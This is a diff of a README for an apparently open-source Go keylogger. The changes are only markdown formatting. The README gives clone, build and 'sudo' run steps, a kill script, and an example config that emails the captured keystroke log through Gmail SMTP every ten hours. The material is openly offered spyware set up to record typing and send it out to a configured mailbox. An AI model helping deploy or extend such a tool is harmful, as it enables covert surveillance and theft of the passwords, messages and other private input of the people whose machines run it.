@@ -1,9 +1,9 @@
-keylogger golang
-
-install : 
+# keylogger golang
+```
+# install:
 $ git clone github.com/mehrati/gokeylogger
 $ cd gokeylogger/
-edit conf.toml with nano or vim or ..
+# edit conf.toml with nano or vim or ..
 -----------------------conf.toml example------------------------------
 cron_duration = "@every 10h" # send mail keylog file every 10 hour
 from_mail = "******@gmail.com" # address send email 
@@ -13,9 +13,10 @@ subject_mail = "keylogger" # subject mail
 host_mail = "smtp.gmail.com" # host mail
 pass_mail = "*****" # password mail
 port_mail = 587 # port mail
------------------------------------------------------------------------
+---------------------------------------------------------------------
 $ go build
-run : 
+# run : 
 $ sudo ./gokeylogger
-kill :
+# kill :
 $ ./kill.sh
+```
